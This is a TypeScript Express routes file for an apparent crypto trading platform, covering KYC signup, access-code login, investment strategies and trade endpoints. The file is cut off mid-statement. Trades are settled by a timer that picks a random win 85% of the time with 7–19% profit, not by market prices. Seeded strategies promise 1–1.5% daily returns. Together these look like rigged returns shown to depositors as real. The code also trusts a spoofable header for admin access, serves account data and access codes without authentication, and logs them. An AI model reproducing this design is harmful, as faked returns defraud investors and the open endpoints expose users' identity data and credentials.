// server/routes.ts

import { Router, Request, Response, NextFunction, Express } from 'express';
import { z } from 'zod';
import { storage } from './storage'; // Import the initialized storage module
import {
  insertKycSchema,
  accounts, // Explicitly import accounts schema
  investments, // Explicitly import investments schema
  strategies, // Explicitly import strategies schema
  kycVerifications, // Explicitly import kycVerifications schema
  cryptocurrencies, // Explicitly import cryptocurrencies schema
  trades, // Explicitly import trades schema
  type UserProfile, // Assuming this type is defined in @shared/schema
  insertTradeSchema,
  selectTradeSchema, // For mapping DB results to frontend Trade type
  type Account, // Type for accounts table select
  type InsertAccount, // Type for accounts table insert (DB format)
  type Trade, // Type for trades table select
  type InsertTrade, // Type for trades table request payload (from frontend)
  type Cryptocurrency, // Type for cryptocurrencies table select
  type InsertKyc, // Type for kyc_verifications table insert, used for incoming request
} from './shared/schema'; // Import relevant Zod schemas and types
import { drizzle } from 'drizzle-orm/node-postgres';
import { Pool } from 'pg';
import { desc, eq, and, lte } from 'drizzle-orm';
import nodemailer from 'nodemailer';
import cors from 'cors';
import { v4 as uuidv4 } from 'uuid'; // Import uuid for generating IDs
import express from 'express'; // Ensure express is imported

const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
});

// Explicitly define the schema object for Drizzle
const schema = {
  accounts,
  investments,
  strategies,
  kycVerifications,
  cryptocurrencies,
  trades,
  // Add any other tables you have in your @shared/schema/index.ts
};

export const db = drizzle(pool, { schema });

// Helper to convert numbers/strings to string for Drizzle decimal types
const numToString = (val: number | string | null | undefined): string | null => {
  if (val === null || val === undefined) return null;
  // Ensure it's a number before converting to fixed decimal string
  const num = typeof val === 'string' ? parseFloat(val) : val;
  if (isNaN(num)) return null;
  return num.toFixed(8); // Use 8 decimal places for financial precision
};

// Helper to convert Drizzle decimal string to number for frontend
const stringToNum = (val: string | null | undefined): number => { // Changed return type to number for consistency
  if (val === null || val === undefined) return 0; // Default to 0 if null/undefined
  const num = parseFloat(val);
  return isNaN(num) ? 0 : num; // Default to 0 if NaN
};

// --- Nodemailer Transporter Configuration ---
const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: process.env.EMAIL_USER || 'your_gmail_account@gmail.com', // Replace with your Gmail user
    pass: process.env.EMAIL_APP_PASSWORD || 'your_gmail_app_password' // Replace with your Gmail App Password
  }
});

// --- Admin Middleware (Simple Email Check) ---
const isAdmin = (req: Request, res: Response, next: NextFunction) => {
  const userEmail = req.headers['x-user-email'];
  if (userEmail === 'calvingleichner181@gmail.com') { // Admin email
    next();
  } else {
    return res.status(403).json({ error: "Access Denied: You are not authorized to access admin routes." });
  }
};

/**
 * Generates a unique 8-digit random number string (UID) for Accounts.
 * It ensures the generated UID does not already exist in the 'accounts' table.
 * @returns {Promise<string>} A promise that resolves to a unique 8-digit UID string.
 */
async function generateUniqueAccountUid(): Promise<string> {
  let uid: string;
  let isUnique = false;
  const MAX_ATTEMPTS = 10;
  let attempts = 0;

  while (!isUnique && attempts < MAX_ATTEMPTS) {
    uid = Math.floor(10000000 + Math.random() * 90000000).toString(); // Generate an 8-digit number
    try {
      // Check if this UID already exists in the 'accounts' table
      const existing = await db.select({ id: accounts.id }).from(accounts).where(eq(accounts.uid, uid)).limit(1);
      if (existing.length === 0) {
        isUnique = true;
      }
    } catch (error) {
      console.error("Error checking Account UID uniqueness:", error);
      throw new Error(`Database error during UID generation: ${(error as Error).message}`);
    }
    attempts++;
  }

  if (!isUnique) {
    throw new Error("Failed to generate a unique Account UID after multiple attempts.");
  }
  return uid;
}


// Function to simulate a cryptocurrency price for a given cryptoId
// In a real application, this would fetch from a live market data API
async function getSimulatedCryptoPrice(cryptoId: string): Promise<number> {
  // Fetch current price from DB based on cryptoId
  const crypto = await db.query.cryptocurrencies.findFirst({ // Added await here
    where: eq(cryptocurrencies.id, cryptoId), // Use directly imported cryptocurrencies
  });

  if (crypto && crypto.price) { // Changed current_price to price based on new schema
    return parseFloat(crypto.price);
  }

  // Fallback to a hardcoded price if not found or price is null
  switch (cryptoId) {
    case 'bitcoin': return 30000;
    case 'ethereum': return 2000;
    case 'tether': return 1; // USDT
    default: return 100; // Default price for unknown cryptos
  }
}

// Add these constants at the top of your routes.ts file, perhaps near other constants or configs
const WIN_PERCENTAGE_SIMULATION = 0.85; // 85% win rate

// Win Profit Range (7% to 19%)
const MIN_PROFIT_PERCENTAGE = 0.07; // 7%
const MAX_PROFIT_PERCENTAGE = 0.19; // 19%

// Lose Loss Range (1% to 5%)
const MIN_LOSS_PERCENTAGE = 0.01; // 1%
const MAX_LOSS_PERCENTAGE = 0.05; // 5%

// --- Trade Resolution Logic (runs periodically) ---
async function resolvePendingTrades() {
  console.log(`[express] Trade resolution process started at ${new Date().toLocaleTimeString('en-US', { hour12: false })}.`);
  try {
    const nowMs = Date.now(); // Get current timestamp once for consistency

    // Fetch trades that are 'pending' and whose 'delivery_time' has passed
    const pendingTrades = await db
      .select()
      .from(trades) // Use directly imported trades
      .where(
        and(
          eq(trades.status, 'pending'), // Use directly imported trades
          // Ensure delivery_time from DB is compared as a number (it's stored as INTEGER)
          lte(trades.delivery_time, nowMs) // Use directly imported trades
        )
      );

    console.log(`[express] Found ${pendingTrades.length} pending trades to check.`);

    for (const trade of pendingTrades) {
      // Convert delivery_time from DB type to number for comparison
      const deliveryTimeMs = Number(trade.delivery_time);

      console.log(`[express] PENDING TRADE CHECK: ID: ${trade.id}, Delivery Time: ${new Date(deliveryTimeMs).toLocaleString()}, Current Server Time: ${new Date(nowMs).toLocaleString()}, Status: ${trade.status}`);

      if (nowMs >= deliveryTimeMs) {
        console.log(`[express] >>> TRADE ${trade.id} IS PAST ITS DELIVERY TIME (Ready for resolution) <<<`);
        console.log(`[express] Processing trade ID: ${trade.id} within resolution loop.`);

        // --- SIMULATION LOGIC STARTS HERE ---
        let outcome: 'win' | 'loss' | 'draw' = 'draw'; // Default to draw, then determine win/loss
        let finalAmount = 0;
        let gainPercentage = 0;
        let simulatedFinalPrice = parseFloat(trade.initial_price || '0'); 

        const randomNumber = Math.random(); // Generates a number between 0 (inclusive) and 1 (exclusive)

        const initialAmountInvested = parseFloat(trade.amount || '0');
        const initialPriceAtTrade = parseFloat(trade.initial_price || '0');

        if (randomNumber < WIN_PERCENTAGE_SIMULATION) {
          // WIN SCENARIO (85% of the time)
          outcome = 'win';
          // Calculate a random profit percentage between MIN_PROFIT_PERCENTAGE and MAX_PROFIT_PERCENTAGE
          const randomProfitPercentage = MIN_PROFIT_PERCENTAGE + (Math.random() * (MAX_PROFIT_PERCENTAGE - MIN_PROFIT_PERCENTAGE));
          gainPercentage = randomProfitPercentage * 100; // Convert to percentage value for storage (e.g., 7.5 instead of 0.075)

          const profitAmount = initialAmountInvested * randomProfitPercentage;
          finalAmount = initialAmountInvested + profitAmount;
          
          simulatedFinalPrice = initialPriceAtTrade * (1 + randomProfitPercentage);

          console.log(`[express] Trade ${trade.id} outcome: WIN (${gainPercentage.toFixed(2)}%). Initial: ${initialAmountInvested.toFixed(2)}, Profit: ${profitAmount.toFixed(2)}, Final: ${finalAmount.toFixed(2)}`);

        } else {
          // LOSS SCENARIO (15% of the time)
          outcome = 'loss';
          // Calculate a random loss percentage between MIN_LOSS_PERCENTAGE and MAX_LOSS_PERCENTAGE
          const randomLossPercentage = MIN_LOSS_PERCENTAGE + (Math.random() * (MAX_LOSS_PERCENTAGE - MIN_LOSS_PERCENTAGE));
          gainPercentage = -randomLossPercentage * 100; // Store as negative percentage

          const lossAmount = initialAmountInvested * randomLossPercentage;
          finalAmount = initialAmountInvested - lossAmount;
          
          simulatedFinalPrice = initialPriceAtTrade * (1 - randomLossPercentage);

          console.log(`[express] Trade ${trade.id} outcome: LOSS (${gainPercentage.toFixed(2)}%). Initial: ${initialAmountInvested.toFixed(2)}, Loss: ${lossAmount.toFixed(2)}, Final: ${finalAmount.toFixed(2)}`);
        }

        // --- Update user's balance ---
        const [userAccount] = await db.select().from(accounts).where(eq(accounts.id, trade.user_id)); // Use directly imported accounts
        if (userAccount) {
          const currentBalance = parseFloat(userAccount.balance);
          
          // CORRECTED: Add the entire finalAmount back to the balance, as initial investment was deducted
          const newBalance = currentBalance + finalAmount; 
          
          await db
            .update(accounts) // Use directly imported accounts
            .set({ balance: numToString(newBalance) })
            .where(eq(accounts.id, trade.user_id)); // Use directly imported accounts
          console.log(`[express] User ${trade.user_id} balance updated from ${currentBalance.toFixed(2)} to ${newBalance.toFixed(2)}.`);
        } else {
          console.warn(`[express] User account ${trade.user_id} not found for trade ${trade.id}. Cannot update balance.`);
        }

        // --- Update trade status in DB ---
        await db
          .update(trades) // Use directly imported trades
          .set({
            status: 'completed',
            outcome: outcome,
            gain_percentage: numToString(gainPercentage),
            final_amount: numToString(finalAmount),
            simulated_final_price: numToString(simulatedFinalPrice),
            current_trade_value: numToString(finalAmount), // After resolution, current value is final amount
            current_gain_loss_percentage: numToString(gainPercentage), // After resolution, current gain is final gain
          })
          .where(eq(trades.id, trade.id)); // Use directly imported trades
        console.log(`[express] Trade ${trade.id} resolved successfully with outcome: ${outcome}.`);

      } else {
        // Trade is not yet ready for resolution
        console.log(`[express] Trade ${trade.id} is not yet ready for resolution.`);
      }
    }
  } catch (error) {
    console.error(`[express] Error resolving trades: ${(error as Error).message}`, error);
  } finally {
    console.log(`[express] Trade resolution process finished at ${new Date().toLocaleTimeString('en-US', { hour12: false })}.`);
  }
}

setInterval(resolvePendingTrades, 60 * 1000); // Run every 60 seconds (1 minute)

// --- Strategy Seeding Function ---
async function seedStrategies() {
  console.log('[Backend] Attempting to seed default strategies...');
  try {
    const existingStrategies = await db.select().from(strategies).limit(1); // Check if any strategy exists

    if (existingStrategies.length === 0) {
      console.log('[Backend] No strategies found. Seeding default strategies...');
      const defaultStrategies = [
        { id: '5day', name: '5-Day Strategy', dailyReturn: '0.015', maxDrawdown: '0.02', duration_days: 5 }, // 1.5% daily return
        { id: '30day', name: '30-Day Strategy', dailyReturn: '0.012', maxDrawdown: '0.05', duration_days: 30 }, // 1.2% daily return
        { id: '90day', name: '90-Day Strategy', dailyReturn: '0.010', maxDrawdown: '0.08', duration_days: 90 }, // 1.0% daily return
      ];

      const inserted = await db.insert(strategies).values(defaultStrategies).returning(); // Added .returning()
      console.log('[Backend] Default strategies seeded successfully. Inserted:', inserted); // Log inserted strategies
    } else {
      console.log('[Backend] Strategies already exist in DB. Skipping initial seeding.');
    }
  } catch (error) {
    console.error(`[Backend] Error seeding strategies: ${(error as Error).message}`, error);
  }
}


export function registerRoutes(app: Express) {
  // Enable CORS for all routes if not already done globally
  app.use(cors({
    origin: [
      "http://localhost:3000",
      "https://new-hive.netlify.app",
      "https://pi-coin-converter.netlify.app/",
      "https://pi-converter.netlify.app",
      "http://localhost:6061"
    ],
    methods: ['GET', 'POST', 'PUT', 'DELETE'],
    allowedHeaders: ['Content-Type', 'Authorization', 'x-user-email'], // <-- make sure x-user-email is here
    credentials: true // (optional, if you use cookies or auth)
  }));

  // Middleware to parse JSON bodies
  app.use(express.json());

  // Call strategy seeding on server startup and AWAIT it
  seedStrategies().then(() => {
    console.log('[Backend] Strategy seeding promise resolved. Server is ready to handle investment requests.');
  }).catch(error => {
    console.error('[Backend] Strategy seeding failed during startup:', error);
  });


  // --- Profile Routes ---
  app.get("/api/profile/:userId", async (req, res) => {
    const { userId } = req.params;
    try {
      // Corrected: Query 'accounts' table for user profile
      const userAccount = await db.query.accounts.findFirst({
        where: eq(accounts.id, userId), // Use directly imported accounts
      });

      if (!userAccount) {
        return res.status(404).json({ error: "User profile not found." });
      }

      // Construct UserProfile from the fetched account data
      const responseProfile: UserProfile = {
        id: userAccount.id,
        username: userAccount.username || '', // Ensure username is string, fallback to empty string
        email: userAccount.email,
        balance: parseFloat(userAccount.balance),
        kycStatus: userAccount.status, // Assuming 'status' in accounts table is kycStatus
        country: userAccount.country,
        documentType: userAccount.documentType,
        accessCode: userAccount.accessCode || '',
        uid: userAccount.uid,
      };

      res.json(responseProfile);
    } catch (error) {
      console.error("Failed to fetch user profile:", error);
      res.status(500).json({ error: "Failed to fetch user profile" });
    }
  });

  app.post("/api/profile", async (req, res) => {
    try {
      const parsedProfile = insertKycSchema.parse(req.body);
      const newKycRecord: InsertKyc = {
        ...parsedProfile,
        id: uuidv4(), // Generate UUID for new KYC record
        // The user_id for KYC should link to an existing account's ID.
        // This route assumes the user_id is part of the parsedProfile or derived.
        // For simplicity, if this is a registration flow, `parsedProfile.id` might be the user_id.
        // However, if it's for *submitting KYC for an existing user*, you'd need userId from request.
        // For now, it's treated as a KYC submission for an existing (or implicitly created) user.
        user_id: parsedProfile.user_id || uuidv4(), // Placeholder if not provided, ideally it should be provided
        status: 'pending', // Default status
        created_at: new Date(),
        updated_at: new Date(),
      };

      // Corrected: Insert into kycVerifications schema
      await db.insert(kycVerifications).values(newKycRecord); // Use directly imported kycVerifications

      // Note: This route does NOT create an account. It only handles KYC submission.
      // Account creation should happen via /api/account or /api/register.
      res.status(201).json({ message: "KYC submitted successfully!", kycId: newKycRecord.id });
    } catch (error) {
      console.error("Failed to create profile (KYC submission):", error);
      if (error instanceof z.ZodError) {
        return res.status(400).json({ errors: error.errors });
      }
      res.status(500).json({ error: "Failed to create profile (KYC submission)" });
    }
  });

  // --- Account Creation Route (Now handles all account & KYC data) ---
  app.post("/api/account", async (req, res) => {
    console.log("Received body for account creation (combined KYC & account data):", req.body);
    try {
      const requestData = insertKycSchema.parse(req.body);

      const generatedAccountId = uuidv4();
      const generatedUid = await generateUniqueAccountUid();
      const accountUsername = `${requestData.firstName || ''} ${requestData.lastName || ''}`.trim(); // Ensure username is always a string

      const initialBalance = "0.00"; // All new accounts start with 0 balance

      const accountDataForDb: InsertAccount = {
        id: generatedAccountId,
        username: accountUsername, // Changed to username to match schema
        balance: initialBalance,
        status: 'pending', // Initial KYC status
        uid: generatedUid,
        email: requestData.email,
        accessCode: requestData.accessCode,
        country: requestData.country,
        documentType: requestData.documentType,
        firstName: requestData.firstName,
        lastName: requestData.lastName, // Corrected: Use requestData.lastName
      };

      console.log("[Backend] Attempting to insert new account:", accountDataForDb);
      const [newAccountRecord] = await db.insert(accounts).values(accountDataForDb).returning();

      if (!newAccountRecord) {
        console.error("[Backend] Failed to return new account record after insert.");
        throw new Error("Failed to create account record.");
      }
      console.log("[Backend] Successfully inserted new account:", newAccountRecord);


      const userProfile: UserProfile = {
        id: newAccountRecord.id,
        email: newAccountRecord.email,
        username: newAccountRecord.username || '', // Ensure username is string, fallback to empty string
        balance: parseFloat(newAccountRecord.balance),
        kycStatus: newAccountRecord.status,
        country: newAccountRecord.country,
        documentType: newAccountRecord.documentType,
        accessCode: newAccountRecord.accessCode || '',
        uid: newAccountRecord.uid,
      };

      return res.status(200).json(userProfile);

    } catch (err) {
      console.error("Account creation error:", err);
      if (err instanceof z.ZodError) {
        return res.status(400).json({ error: "Validation failed", details: err.issues });
      }
      return res.status(500).json({ error: "Internal Server Error", details: (err as Error).message });
    }
  });

  // --- Fetch Account by ID ---
  app.get("/api/account/:id", async (req, res) => {
    try {
      const { id } = req.params;
      const [account] = await db
        .select()
        .from(accounts)
        .where(eq(accounts.id, id));
      if (!account) {
        return res.status(404).json({ error: "Account not found" });
      }
      const userProfile: UserProfile = {
        id: account.id,
        email: account.email,
        username: account.username || '', // Ensure username is string, fallback to empty string
        balance: parseFloat(account.balance),
        kycStatus: account.status,
        country: account.country,
        documentType: account.documentType,
        accessCode: account.accessCode || '',
        uid: account.uid,
      };
      return res.json(userProfile);
    } catch (error) {
      console.error("Failed to fetch account:", error);
      return res.status(500).json({ error: "Failed to fetch account" });
    }
  });

  // --- Auth Route ---
  app.post("/api/auth", async (req, res) => {
    const { email, accessCode } = req.body;
    if (!email || !accessCode) {
      return res.status(400).json({ error: "Email and access code are required" });
    }
    try {
      const [user] = await db
        .select()
        .from(accounts) // Use directly imported accounts
        .where(
          and(
            eq(accounts.email, email), // Use directly imported accounts
            eq(accounts.accessCode, accessCode) // Use directly imported accounts
          )
        );
      if (!user) {
        return res.status(401).json({ error: "Invalid credentials" });
      }

      const userProfile: UserProfile = {
        id: user.id,
        email: user.email,
        username: user.username || '', // Ensure username is string, fallback to empty string
        balance: parseFloat(user.balance),
        kycStatus: user.status,
        country: user.country,
        documentType: user.documentType,
        accessCode: user.accessCode || '',
        uid: user.uid,
      };

      res.setHeader('Content-Type', 'application/json');
      return res.json(userProfile);
    } catch (error) {
      console.error("Auth error:", error);
      return res.status(500).json({ error: "Failed to authenticate" });
    }
  });

  // --- Investment Routes ---
  app.post("/api/invest", async (req, res) => {
    const { userId, amount, strategyId } = req.body;

    console.log(`[Backend] Received investment request for /api/invest: User ${userId}, Amount ${amount}, Strategy ${strategyId}`);

    if (!userId || typeof amount !== 'number' || !strategyId) {
      console.error("[Backend] Validation failed for /api/invest: Missing userId, amount, or strategyId.");
      return res.status(400).json({ error: "User ID, amount, and strategy ID are required." });
    }

    try {
      // Deduct amount from user's balance
      const userAccount = await db.query.accounts.findFirst({
        where: eq(accounts.id, userId), // Use directly imported accounts
      });

      if (!userAccount) {
        console.warn(`[Backend] User account ${userId} not found for investment.`);
        return res.status(404).json({ error: "User account not found." });
      }

      const currentBalance = parseFloat(userAccount.balance);
      if (currentBalance < amount) {
        console.warn(`[Backend] Insufficient balance for user ${userId}. Current: ${currentBalance}, Attempted: ${amount}`);
        return res.status(400).json({ error: "Insufficient balance." });
      }

      const newBalance = currentBalance - amount;
      await db
        .update(accounts) // Use directly imported accounts
        .set({ balance: numToString(newBalance) })
        .where(eq(accounts.id, userId)); // Use directly imported accounts
      console.log(`[Backend] User ${userId} balance updated from ${currentBalance.toFixed(2)} to ${newBalance.toFixed(2)}.`);


      // Fetch strategy details to get durationDays and expectedReturn
      const selectedStrategy = await db.query.strategies.findFirst({
        where: eq(strategies.id, strategyId), // Use directly imported strategies
      });

      console.log(`[Backend] Fetched strategy for ID ${strategyId}:`, selectedStrategy); // NEW LOG

      if (!selectedStrategy) {
        console.warn(`[Backend] Strategy ${strategyId} not found for investment.`);
        return res.status(404).json({ error: "Strategy not found." });
      }

      // Insert the investment into the 'investments' table
      const newInvestmentId = uuidv4();
      const investmentData = {
        id: newInvestmentId,
        userId: userId,
        strategyId: strategyId,
        investmentAmount: numToString(amount)!,
        currentValue: numToString(amount)!, // Initial current value is the investment amount
        startDate: new Date(), // Current timestamp
        durationDays: selectedStrategy.duration_days, // Assuming strategies table has duration_days
        status: 'active',
        createdAt: new Date(),
        updatedAt: new Date(),
      };
      console.log("[Backend] Attempting to insert new investment:", investmentData);
      const [insertedInvestment] = await db.insert(investments).values(investmentData).returning(); // Use directly imported investments

      if (!insertedInvestment) {
        console.error("[Backend] Failed to return new investment record after insert.");
        throw new Error("Failed to create investment record.");
      }
      console.log("[Backend] Successfully inserted new investment:", insertedInvestment);


      res.status(200).json({ success: true, message: "Investment simulated successfully!", investmentId: newInvestmentId });
    } catch (error) {
      console.error("[Backend] Error processing investment:", error);
      res.status(500).json({ error: "Failed to process investment", details: (error as Error).message });
    }
  });

  // --- GET User Investments (Updated to fetch from DB) ---
  app.get("/api/user-investments", async (req, res) => {
    const { userId } = req.query; // Expect userId as a query parameter
    console.log(`[Backend] Received request for /api/user-investments for userId: ${userId}`);

    if (!userId) {
      console.warn("[Backend] User ID is missing for /api/user-investments request.");
      return res.status(400).json({ error: "User ID is required." });
    }

    try {
      // Fetch actual user investments from the database
      const userInvestments = await db
        .select({
          id: investments.id, // Use directly imported investments
          userId: investments.userId, // Use directly imported investments
          strategyId: investments.strategyId, // Use directly imported investments
          strategyName: strategies.name, // Use directly imported strategies
          investmentAmount: investments.investmentAmount, // Use directly imported investments
          currentValue: investments.currentValue, // Use directly imported investments
          startDate: investments.startDate, // Use directly imported investments
          durationDays: investments.durationDays, // CORRECTED: From investments table
          status: investments.status, // Use directly imported investments
          createdAt: investments.createdAt, // Use directly imported investments
          updatedAt: investments.updatedAt, // Use directly imported investments
          expectedReturn: strategies.dailyReturn, // Use directly imported strategies (matches schema)
        })
        .from(investments) // Use directly imported investments
        .leftJoin(strategies, eq(investments.strategyId, strategies.id)) // Use directly imported strategies and investments
        .where(eq(investments.userId, userId as string)); // Use directly imported investments

      console.log(`[Backend] Found ${userInvestments.length} investments for user ${userId}. Raw DB data:`, userInvestments);

      // Map Drizzle results to the frontend ActiveInvestment interface
      const formattedInvestments = userInvestments.map(inv => ({
          id: inv.id,
          userId: inv.userId,
          strategyId: inv.strategyId,
          strategyName: inv.strategyName || 'Unknown Strategy', // Fallback if strategy name is not found
          investmentAmount: parseFloat(inv.investmentAmount), // Convert decimal string to number
          currentValue: parseFloat(inv.currentValue), // Convert decimal string to number
          expectedReturn: inv.expectedReturn ? parseFloat(inv.expectedReturn).toFixed(2) : 'N/A', // Format expected return, removed "% daily" as it's a number
          status: inv.status,
          startDate: inv.startDate instanceof Date ? inv.startDate.toISOString() : inv.startDate, // Ensure ISO string format
          durationDays: inv.durationDays,
          createdAt: inv.createdAt?.toISOString(),
          updatedAt: inv.updatedAt?.toISOString(),
      }));

      console.log(`[Backend] Formatted ${formattedInvestments.length} investments for user ${userId}:`, formattedInvestments);
      return res.json(formattedInvestments);
    } catch (error) {
      console.error("[Backend] Failed to fetch user investments:", error);
      return res.status(500).json({ error: "Failed to fetch user investments", details: (error as Error).message });
    }
  });

  // --- NEW: Get All Cryptocurrencies Endpoint ---
  app.get("/api/cryptocurrencies", async (req, res) => {
    try {
      const cryptos = await db.select().from(cryptocurrencies);

      // Map Drizzle results to frontend Cryptocurrency type, converting numeric strings to numbers
      const formattedCryptos = cryptos.map(crypto => ({
        ...crypto,
        price: stringToNum(crypto.price),
        change24h: stringToNum(crypto.change24h),
        price_change_24h: stringToNum(crypto.price_change_24h),
        volume24h: stringToNum(crypto.volume_24h),
      }));
      
      console.log("[Backend] Fetched cryptocurrencies:", formattedCryptos);
      return res.json(formattedCryptos);
    } catch (error) {
      console.error("[Backend] Failed to fetch cryptocurrencies:", error);
      return res.status(500).json({ error: "Failed to fetch cryptocurrencies", details: (error as Error).message });
    }
  });


  // REVISED /api/trades (Single Trade) - Removed redundant balance check/deduction
  app.post("/api/trades", async (req, res) => {
    try {
      console.log("Incoming single trade request body:", req.body);
      // Ensure cryptoId is a string if it comes as number from frontend payload
      if (req.body.crypto_id && !req.body.cryptoId) {
        req.body.cryptoId = String(req.body.crypto_id);
      }
      const validatedData = insertTradeSchema.parse(req.body);
      // No need for balance check or deduction here, as it's handled by /api/invest

      // --- NEW: Deduct amount from user's balance --- [START]
      const userAccount = await db.query.accounts.findFirst({
        where: eq(accounts.id, validatedData.userId),
      });

      if (!userAccount) {
        console.warn(`[Backend] User account ${validatedData.userId} not found for trade.`);
        return res.status(404).json({ error: "User account not found." });
      }

      const currentBalance = parseFloat(userAccount.balance);
      const tradeAmount = parseFloat(numToString(validatedData.amount) || '0'); // Ensure tradeAmount is a number

      if (currentBalance < tradeAmount) {
        console.warn(`[Backend] Insufficient balance for user ${validatedData.userId}. Current: ${currentBalance}, Attempted: ${tradeAmount}`);
        return res.status(400).json({ error: "Insufficient balance." });
      }

      const newBalance = currentBalance - tradeAmount;
      await db
        .update(accounts)
        .set({ balance: numToString(newBalance) })
        .where(eq(accounts.id, validatedData.userId));
      console.log(`[Backend] User ${validatedData.userId} balance updated from ${currentBalance.toFixed(2)} to ${newBalance.toFixed(2)} due to trade.`);
      // --- NEW: Deduct amount from user's balance --- [END]

      const tradeToInsert: typeof trades.$inferInsert = { // Use directly imported trades
        id: validatedData.id,
        user_id: validatedData.userId,
        crypto_id: validatedData.cryptoId, // No need for String() as it's already string from Zod
        crypto_name: validatedData.cryptoName,
        crypto_symbol: validatedData.cryptoSymbol,
        type: validatedData.type,
        direction: validatedData.direction,
        amount: numToString(validatedData.amount)!,
        initial_price: numToString(validatedData.entryPrice)!,
        delivery_time: validatedData.deliveryTime, // Stored as integer
        status: validatedData.status || 'pending',
        timestamp: validatedData.timestamp || Date.now(), // Stored as integer
        email: validatedData.email,
        outcome: validatedData.outcome,
        gain_percentage: numToString(validatedData.gainPercentage),
        final_amount: numToString(validatedData.finalAmount),
        simulated_final_price: numToString(validatedData.simulatedFinalPrice),
        current_trade_value: numToString(validatedData.finalAmount), // After resolution, current value is final amount
        current_gain_loss_percentage: numToString(validatedData.currentGainLossPercentage),
      };

      console.log("Single trade to insert (after Zod and conversions):", tradeToInsert);

      const [trade] = await db.insert(trades).values(tradeToInsert).returning(); // Use directly imported trades

      // IMPORTANT: Balance update for the trade itself is NOT done here.
      // It's assumed that the /api/invest endpoint has already handled the initial deduction.
      // The trade resolution logic will handle adding final_amount back.

      // Map the DB result back to the frontend Trade type for response
      const parsedTrade: Trade = {
        ...trade,
        amount: parseFloat(trade.amount || '0'),
        initialPrice: parseFloat(trade.initial_price || '0'),
        gainPercentage: trade.gain_percentage !== null ? parseFloat(trade.gain_percentage) : null,
        finalAmount: trade.final_amount !== null ? parseFloat(trade.final_amount) : null,
        simulatedFinalPrice: trade.simulated_final_price !== null ? parseFloat(trade.simulated_final_price) : null,
        currentTradeValue: trade.current_trade_value !== null ? parseFloat(trade.current_trade_value) : null,
        currentGainLossPercentage: trade.current_gain_loss_percentage !== null ? parseFloat(trade.current_gain_loss_percentage) : null,
        timestamp: Number(trade.timestamp),
        deliveryTime: Number(trade.delivery_time),
        userId: trade.user_id,
        cryptoId: trade.crypto_id, // Keep as string here, frontend will convert for comparison
        entryPrice: parseFloat(trade.initial_price || '0'),
      };
      return res.status(201).json(parsedTrade);
    } catch (error) {
      if (error instanceof z.ZodError) {
        console.error("Single Trade validation failed:", error.errors);
        return res.status(400).json({ error: "Validation failed", details: error.errors });
      }
      console.error("Failed to create single trade:", error);
      return res.status(500).json({ error: "Failed to create single trade", details: (error as Error).message });
    }
  });

  // --- REVISED /api/transactions (Multiple Trades) ---
  app.post("/api/transactions", async (req, res) => {
    try {
      console.log("Incoming multi-trade request body:", req.body);

      const { userId, transactions } = req.body;

      if (!userId || !Array.isArray(transactions)) {
        return res.status(400).json({ error: "userId and an array of transactions are required in the request body." });
      }

      const validatedTransactions = transactions.map((trade: any) => insertTradeSchema.parse({
        id: trade.id,
        userId: userId,
        cryptoId: trade.cryptoId, // cryptoId is now string
        cryptoName: trade.cryptoName,
        cryptoSymbol: trade.cryptoSymbol,
        type: trade.type,
        direction: trade.direction,
        amount: trade.amount,
        entryPrice: trade.entryPrice,
        deliveryTime: trade.deliveryTime,
        status: trade.status,
        timestamp: trade.timestamp,
        email: trade.email,
        gainPercentage: trade.gainPercentage,
        finalAmount: trade.finalAmount,
        simulatedFinalPrice: trade.simulatedFinalPrice,
        currentTradeValue: trade.currentTradeValue,
        currentGainLossPercentage: trade.currentGainLossPercentage,
        outcome: trade.outcome,
      }));


      const tradesToInsert: typeof trades.$inferInsert[] = validatedTransactions.map(trade => ({ // Use directly imported trades
        id: trade.id,
        user_id: trade.userId,
        crypto_id: trade.cryptoId, // Ensure crypto_id is string for DB
        crypto_name: trade.cryptoName,
        crypto_symbol: trade.cryptoSymbol,
        type: trade.type,
        direction: trade.direction,
        amount: numToString(trade.amount)!,
        initial_price: numToString(trade.entryPrice)!,
        delivery_time: trade.deliveryTime, // Stored as integer
        status: trade.status || 'pending',
        timestamp: trade.timestamp || Date.now(), // Stored as integer
        email: trade.email,
        outcome: trade.outcome,
        gain_percentage: numToString(trade.gainPercentage),
        final_amount: numToString(trade.finalAmount),
        simulated_final_price: numToString(trade.simulatedFinalPrice),
        current_trade_value: numToString(trade.currentTradeValue),
        current_gain_loss_percentage: numToString(trade.currentGainLossPercentage),
      }));

      console.log("Final trades to insert into Drizzle DB:", tradesToInsert);

      await db.insert(trades).values(tradesToInsert); // Use directly imported trades
      return res.json({ success: true, message: "Transactions saved successfully." });
    } catch (error) {
      console.error("Failed to save transactions:", error);
      if (error && typeof error === 'object' && 'code' in error && typeof error.code === 'string') {
        switch (error.code) {
          case '23502':
            return res.status(400).json({ error: `Database constraint violation: Missing required data for column '${(error as any).column || 'unknown'}'.`, details: (error as any).detail || error.message });
          case '22P02':
            return res.status(400).json({ error: "Invalid data format for a database column. Check numeric fields.", details: (error as any).detail || error.message });
          case '23503':
            return res.status(400).json({ error: "Foreign key constraint violation. Make sure referenced IDs exist.", details: (error as any).detail || error.message });
          case '23505':
            return res.status(409).json({ error: "Duplicate entry. An item with this ID already exists.", details: (error as any).detail || error.message });
        }
      }
      if (error instanceof z.ZodError) {
        console.error("Zod Validation Errors (Multi-trade):", error.errors);
        return res.status(400).json({ error: "Validation failed for one or more transactions.", details: error.errors });
      }
      return res.status(500).json({ error: "Failed to save transactions", details: (error as Error).message });
    }
  });

app.get("/api/transactions", async (req, res) => {
  const { email } = req.query;

  if (!email) {
    return res.status(400).json({ error: "Email is a required query parameter." });
  }

  try {
    const trimmedEmail = String(email).trim();

    const tradesData = await db
      .select()
      .from(trades) // Use directly imported trades
      .where(eq(trades.email, trimmedEmail)) // Use directly imported trades
      .orderBy(desc(trades.timestamp)); // Use directly imported trades

    if (tradesData.length === 0) {
      console.warn("No trades found for email:", trimmedEmail);
    }

    // Map DB results to frontend Trade type
    const parsedTrades: Trade[] = tradesData.map(trade => ({
      ...trade,
      amount: parseFloat(trade.amount || '0'),
      initialPrice: parseFloat(trade.initial_price || '0'),
      gainPercentage: trade.gain_percentage !== null ? parseFloat(trade.gain_percentage) : null,
      finalAmount: trade.final_amount !== null ? parseFloat(trade.final_amount) : null,
      simulatedFinalPrice: trade.simulated_final_price !== null ? parseFloat(trade.simulated_final_price) : null,
      currentTradeValue: trade.current_trade_value !== null ? parseFloat(trade.current_trade_value) : null,
